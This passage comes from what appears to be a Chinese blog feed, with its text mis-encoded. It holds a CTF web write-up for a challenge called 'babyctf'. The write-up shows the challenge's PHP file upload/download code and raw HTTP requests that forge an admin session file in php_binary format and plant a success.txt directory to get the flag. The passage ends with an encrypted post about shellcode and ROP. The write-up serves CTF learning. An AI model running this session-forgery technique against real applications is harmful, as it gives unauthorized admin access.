RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå¼€å¯äº†sessionæœºåˆ¶ï¼Œåˆå§‹è®¾ç½®<code>$_SESSION[&#39;username&#39;]=&#39;guest&#39;</code>å¦‚æœ<code>$_SESSION[&#39;username&#39;] ===&#39;admin&#39;</code>è€Œä¸”<code>/var/babyctf/success.txt</code>è¿™ä¸ªæ–‡ä»¶å­˜åœ¨ï¼Œå°±å¯ä»¥è¾“å‡ºflagï¼Œç„¶åçœ‹æ¥ä¸‹æ¥çš„éƒ¨åˆ†ï¼Œé€šè¿‡directionå¯ä»¥è®¾ç½®ä¸Šä¼ æˆ–ä¸‹è½½ï¼Œæœ‰ä¸Šä¼ å’Œä¸‹è½½çš„åŠŸèƒ½ï¼Œä¸Šä¼ éœ€è¦è‡ªå·±ä¼ªé€ ä¸Šä¼ è¡¨å•ï¼Œæ–‡ä»¶è·¯å¾„é€šè¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br></pre></td></tr></table></figure>

<p>æ¥æ‹¼æ¥ï¼Œä¸‹è½½æ–‡ä»¶çš„æ–‡ä»¶å</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">$file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä»–æ¥æ‹¼æ¥ï¼Œ$dirpathä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ†æå¾—åˆ°è§£é¢˜æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>ä¸‹è½½sess_xxæ–‡ä»¶ï¼Œè·å–æœåŠ¡ç«¯sessä¿å­˜æœºåˆ¶ã€‚</li>
<li>ä¸Šä¼ æ–‡ä»¶ä¼ªé€ adminçš„sessionï¼Œå–å¾—ä¼ªé€ åçš„PHPSESSIDï¼Œ</li>
<li>é€šè¿‡atträ¸Šä¼ success.txtæ–‡ä»¶å¤¹ã€‚</li>
<li>ä¿®æ”¹cookieï¼Œåˆ·æ–°ç•Œé¢</li>
</ol>
<p>é¦–å…ˆä¸‹è½½æœåŠ¡å™¨ç«¯sess_xxæ–‡ä»¶</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165506846.png" alt="image-20200419165506846"></p>
<p>æ–‡ä»¶å†…å®¹ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usernames:5:&quot;guest&quot;;&#x2F;&#x2F;æœ‰ä¸€ä¸ªä¸å¯è§å­—ç¬¦ä¸º0x08</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åæ¥å¾—çŸ¥åç«¯phpé‡‡ç”¨çš„æ˜¯php_binaryçš„sessionä¿å­˜æœºåˆ¶ï¼Œé”®åé•¿åº¦å¯¹åº”çš„ascå­—ç¬¦  é”®å   serializeåçš„å­—ç¬¦ä¸²</p>
</blockquote>
<p>ç„¶åæœ¬åœ°æ­å»ºç¯å¢ƒï¼Œä¿®æ”¹æºç è¾“å‡ºæ–‡ä»¶ä¿å­˜çš„è·¯å¾„</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165338104.png" alt="image-20200419165338104"></p>
<p>å‘åŒ…ï¼›</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;hf&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.35.158</span><br><span class="line">Content-Length: 318</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.35.158</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165647345.png" alt="image-20200419165647345"></p>
<blockquote>
<p>è¿™é‡Œçš„æ–‡ä»¶åä¹Ÿå¯ä»¥ä»¥å¦ä¸€ç§æ–¹æ³•è·å¾—ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥çœ‹tmpç›®å½•ï¼Œå¯¹åº”å¾—ç”Ÿæˆå¾—sessæ–‡ä»¶å¦‚ä¸‹å›¾ï¼š</p>
<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420162317571.png" alt="image-20200420162317571" style="zoom:200%;">

<p>ç„¶åç›´æ¥è®¡ç®—hashå€¼</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420162432734.png" alt="image-20200420162432734"></p>
</blockquote>
<p>ç„¶åå‘æœåŠ¡å™¨ç«¯ä¸Šä¼ æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 318</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165744260.png" alt="image-20200419165744260"></p>
<p>å¯ä»¥æ£€æµ‹ä¸€ä¸‹æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 312</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">download</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419170141101.png" alt="image-20200419170141101"></p>
<p>ä¹‹åé€šè¿‡attrå»ºç«‹success.txtæ–‡ä»¶å¤¹ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6a26ba086a9d4a20a30b6f98d683123677f302903f364ff8.changame.ichunqiu.com</span><br><span class="line">Content-Length: 420</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;e663f4c6b5e24170b6528d6d8b672a197f04b6d3d4ce4f7e.changame.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;attr&quot;</span><br><span class="line"></span><br><span class="line">success.txt</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165832078.png" alt="image-20200419165832078"></p>
<p>ç„¶åä¿®æ”¹cookieï¼Œåˆ·æ–°ç•Œé¢ã€‚</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165937895.png" alt="image-20200419165937895"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>é•¿äº­å…¬å¼€è¯¾â€”â€”Shellcode&amp;ROP</title>
    <url>/2020/04/17/shellcoderop/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">è¾“å…¥å¯†ç ï¼ŒæŸ¥çœ‹æ–‡ç« ã€‚</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="5e8bf91821fa643a68054cbaa06a7ba8fc7a95d83cc479caa48ea190383132dc">00e9038a83f323a6dcc5e2217c465d173cb609081c2d981389969805b9c5216f28ede759063af403306393c2e802db0ac1d3ec7485024277554cfb749b5e0a32d6ea59e56b4befa6ffeca9b2836d7b814a89389d9cac23f6b4efcb1264e89ebb87209b008cf19c3de07d7f0f0d5f1744d4112431d571663f9bbea15c07b9a6341720a18a84f2ec9d75ea2fbbfeb1b0519e2cd3626e681cb706400e55d6b8468a454b6e19589fe9ed29333c44cf8d6f5324993dc7e2af53bfe0a11c7c7704db64d49be691d548cba4b6c4b3c8d95963e81393cead0d6c08bec37720c9c1d65358bbc3b1fd62d3db162de810bbf73b07071eb7ea619a8b992c69528a2b5970d2c4e8662b7b7ede001c26172970725d06c12e9ea8f8d014ee8106ae35e239e336e403c6c23e9590eaa7654b1236c120ff4062654381f00f68b33d3cf80fb86de7525f9c5c4fd3298cc730b074b39aebf41a51dd6b9714e1306188b36a72b960e99e92131d84997935ae617c6a5e919824a29300a310810992bc33be9afa5c357d6e4d05e9fd08445bb580948183feb04063f3f3f83544cd1641df037ed930e6a933573f0271ccb039d908e0cc418c74177dd0fc967be5abc85f027240b6fd426e6364775d9c0fdc0bebaa46e2e90d61902a3abfad758ef5ee9c47ad910d5c34074043a4fdb9285a6fa2656321b3593d63a6093590931ccfcdd6db7262a01989001157022ebf257389c4be8fa4b5451037ec45c9ab9d3ee9b6bd1eb3252f16064e316034e6b043eb910e34d7c4bab49db6f304e2c233d886bb0d013a172d58778053e661d5e11969eb78fecbc8ae8223d5b5ff0125f6af323995a5cc8337f7ec0b3d69abaf9fdc163d1f7e13b5e077c9b3b3147d6df368f219e0c78877227d4b6a286ed9522b1183afeecc0147463e75d9574b214609250ceb6f84ba09627eb777e9892cf374bd26d1c59532c1be6e502dcc7a7e99923b7080ef8c5e2423b3f9dbaaab00ceebb40a1d2ae24fcfbdde2fb31c5491aae74756b5611ae146fcd9c3582ad75afa8e1b3853344cb784ca455b9af81c75c8400348dd2aa03a7378bb7f90c64ce5d01e57240d99d23316338aed5259e2361cdffebeb96fde858753be550e25c33a5fafd5afaf53d5d58973429389c3f82aeb332608bd4614bc518f07bc2913fcf19b96a446a06ea527462f24cbf4532a342f6d4408f7264d823cf217cb557d7c0cfd070d05100fd0a0ef26f14a030f522c83599aadd46b09de8cb4efc139ee3c17a11bfe01a619918561d5d17987c6429377e95a9aa2ea08b7c31180c565cfd5ed750923c41cc4baa2e1ba9bfbede41bfb033c9c756b87e3b3b3e9ea3662a52566d74c3330c279b91af8c559b177db408de4e52dfb1f72b3ca3d5880ec179df9fd7c1767fb4433b27207fbe79c04ef7645a5da6ca79409326a9af6ce2bd036b4a0edfda1a8574897185463b6f4e2d4c03a5a480aa3642a8c0c8308ccd96dab1592004d59dd407b301058eda4ace19bb37fc5d5d858ccd32ef9e5b3dbf33dcaadeae37b2929c991241bbdf4556028aa4b8e6fc8e91156131b1362c7ab669a1777dfe010330598802ec28b91f6249f50d09be6eb0487815cbd1b625faebaee2d4ba9b248ea2bbdc7a9cf34603b6f4494ce9fce0e5f48d5e7c8a230335896208f3cbbb9de491af74b90c7115946186bde3424e72b072806d1b172520f54b56aaaa8936a2f3ea5c7b4f5107860f492c86ffc8afd2f40d93b385a5178bd1b82fe6edcbaeae7b7a4b7d36aafd44d65073499f7e39f6fb5d064b179512e400420c0d5b70c85368f0e3d43ee43585d6615f164bb50d42dcf2bd20e106e72c31eeae55aa941f0d7c9e0415dd175a812afe334beb8c3b6915e8c4584d3dcf18bffae624a4d49d3f69f82f24ff4c20f54540f60cc992bde6d1965142875b9028783d49052bccef43c2f65c3290a38d8e01e2740ae1db0feb13df3ab2015b99e4586be2ad462c45e2b247b836dc8fdf32c75b5995a1ec69896fb18084a78e2bb4980bbe689296419759b5024f7ef4d4d775eabed17c38b807bc90a7def091622fef3c9d9a34168365e4da83665ccb8881871d6bb59b8976c07d74f887c6733b3331f11b856026542398e482cd14121765a1c64bceedb4a7ab7aae27fe4a18025d1f573483776106a18d155ee184f4c2876a3fd02766d69ec2536743a277864000b7424d1ba0ac257468813670e5dadce7aa9a88526a2774f82d99f1e013608400bae43ea7c7d1148d90c5bd3440d0a36b39cea952899da45514212bc159a355b5098a91efd376715f8635b1961a87082c2d201ff23fb742018f08f0e9754c9e5995f51cc252994e43b1bffc5e2e2ef561008b9332126121a595695b6321968ed6e789e6b4493ce81e11625fce8a6b2ba49f4787f21d9be5228d71a9b4c29a53bdf6f5e70e0e498cd9aa1137c9e24f21b139880564736966ac1e3e3bf89e98264e08eb8ade60c7cd68ed7f0f392a51c38fbf8be0877d245ea7b6cce15416db6ae1ab6269d8479177d9ae4d237a12f9f227f85d9fbd7268c7d5142e4972003e20d2fc69229e1b5482ba83d541eecfaff0186da0bcadbddd20575242dac57d3a565f66f90bdaa841f8b326e3f7bc4a250a39a75e5636813ca95502a83cbff943e129efbd0523eee709594aaf4b8f305b3454f3515f50fe4662daeb7fcbbb00258450e769688150e335641b6062012aba9d13a6154e3c5abc95a8ee1c0ff11dd0c6fcd324aada71fba878f13186d4ed61b9e09fcb1f1a13a241aae9565deb8ca2203aaf176b7171f04f46da9b0bc4d5aee13a7502b627fd13df2d17e12b5eaf20f6499a45dd39b43efadea35e553cc4cdbd92c219ecd9a8553ec4ebd32d3395440a1297bb4a81842a7724b53e44d4bf711924d3ca67246ae35b23e17cae30b6b3716f017a1cee2625d4657316aefb8cb4e86cfe7476b46dc91df1e11e9265af15b75e53241c89d2eb6fd837b48cac979a6ac18f000a1060a69af741cccc2b34b5fc13c62aa88c158d16452b76b9e8dda196447429c2628b01af7d6ea637b432122fb91f52b70872a897064a0debfab731adf3bdcf6450ee02d8ab8e5a6977d605c926b40ea6af201e412c1760f24a22b409b50013c69c413197877c020442cca6b5054069e213e9df3db10be39815e8a6a9fd7a701edeba34b0ebd33ca8102756147e96bce2aa408822e17ad56a1ad080bbc0ca3f7fa450639c855a74a2a8dd14deda434b665e4271b3eaecc72b106db3d02e099f71b14e2ddb59ea2fa10aef03e1c9a797a6244f5c84e26afa7383b2efc0cf0b50a7cca9b17b1d06d2c768d474e6f28b3b1cdd90cd482d0fde00a31e56be576cbb47f8bf081ce77315168de28ae9bec77fd1078d10960f67c5ee3e79a2a829764cfcfcb5dd972bcd3f8fddb0bb5d5c9efb20654af681300dab4cc51849e7fc2c683a6fc41821509bc6c5e14863a816b6e60b594ea09a5bfbdbcc16b427ea6ab2bd1281157e4570eccef5ef6e8495586d5d57236a606b6639368a887ff403137b484f4b7614689a3ea8c1fb9889767bffd18cec091d3237e046179f286c95c281116ee7ac821c9f245b488bb105847d514f7016ef44009220b647a39aded82ce51edfcbb3d980e2c98038f1f7bfef2a6ae0b892e1263141b04ee85f1e4232efb7fd356a9ff4788c27c886b81b70491d3011e85b512e7497ad44ae9c28377ff0ecb0dc3d115851c1482d18113e7602dfb647312a715f75aeeae5b7874b6d153bcfcf1cb2c36846818c2513e05b58ed9c007934a1a4d0969da7329c1b16e8295e1a426aa35b29eb4985a04842a8ccd74ad47f939a57318e2b4293941c6fa19aca666145b1d036c46c6a26850b68d8b2d35650d6acc920aa8069cd5626dd8efdbdf4e7a2318ab8e3fa71c7560d3fc667862131971c88c3c7bd41f83797c7e954c157b12f20a4eb0d9d6b28d1e4d0117dc7f09ae155afb1974b74547a20572826bf272eb6b017405c3252965a1986a0aef20129ac07d42b6d085320978484ddab53571e0726025dd3bb63db50bbcf9d2ba9c30ee17639ecebeb0b209af4278baaa0578b0969b644634de017943d005763a536602921c0a5f48d1f26cea96954475b109d60dbfbc2daed90918a1bedda03a4b201f56494ad3789041cf35be090a747b2a472f11c5b77fabb8177c9aabadb406f818aa04452e3946fa70b83d9d9d6abad061ad1758c7b308ba81811c333d3de6d79e0264d7f2a5c595b8e04ba6aa5017cd2f603e1b5280671f571bfb052ca4382e05610613459fd55ca283329c793f7de201d824c43cfa6628362aec28a3c76dbde70da044cb8dda6cae107a5f9ee859f7e29df6e95a8711ecc93458c0bd2bf9d6792c865b19f8763816b7f7cdd1ba56155ee86ac29982f0b9becaa95aead36bc4e482875aaf0f2df2904a0b2ba635c0d4afdad8720487dd358c046dcfa2025e52d64beee1d44f2cd0474d3dd5b0cfd0cb7da9df3eac0d405c57cbef54acfa243e60fe6744c0c7033fcc3bc4a0763809b2a8c6b654e14b02353c72ff530733573d96a50d0f4c32ad10b420fc90e59b8a6a51e9c73d82ae0867e37b57d2bde43642f318ba474aaac7e6e06f9c475833109cb58e5ed536b39ab80cf1af8e8c95cac986e92d120f8b85ff71ced4ebb67076bfbf209844db0d98ff3e86f3fd632902971bae7ced8d9a739c251fec1f33446d6500301baf037a2ed58d4deb8b8904df89a0c697be534584f19bf22930d67f61385c6692b4729f3aa0d3b7851ab724c8578b0a0f0cf5b49ed6098fa9e0d589a86c35cb197126a08eccf9555190061592556c359c1a43f7f57021c522bedb2b865401e566640dbc523fa32cd741661d8c119dcd89e91f15e089d984a9637602124f73033892ecaf30e76822a0c70f801ae6545955b73cd47405b2374aabae62ff8415563f99c9e354851806546f4e7d6169ab632ad3b756461ff72af15ef386e4d2a1f5ff766dc473f6274e209c065bd1717d729c64a57102b1e7eeea3b8de675fccc2fac5de1322e18402c312b294116910ee046fadfc70de148ee40da8b0e60a2d2ce118e47ae51d937f5b75d8093088b1795159b975cbc11f9172cac1036f68772a5fbd3a848a5c19e1198a876853e42adf77290505f82e518fc35e6cb059ed0101e89fcd24c37633499be3c00b03a4f478fea42b7dd671dd86eea81b7d56b0671faedf06a8fc11f711dfa3e553db1b3a3d767b30d1fce911972f836c8973bc9453e76a617b7eeec0686cf989869f142e9a41866a48dedc3e47bb3adfdfb0035596e73a9513f7d58b3a1458223af22e37bd251e4aa99bbe7990bb9f08c653a2dee1c28c01ec46ac8cb309df82f4f47ee804c0420f5b19b41c0c2059234f5a1edd436cdee3ee3cfc5e008541b76d74930255c67108f60bc42554316efc46281f04dd401c6b8d2de25afca48014c328c72f62f8cad1884e89c81bb46e9bffa420565993e47a7460af86a5b6cf4d0a8f44c7704bdfec3444d70f33ff929e88585864f92b73c4022ab8337eee43b471bf75341175919670a7a10ab364aa9a4d46b83de4f41ac374fb865f127b03b267929a7c86663c49a223804ef41b90f69f22742434cde82ade59aa2b08c116602f56834ef2df4190702af66457b363224a9e9899b4a842aa469ec11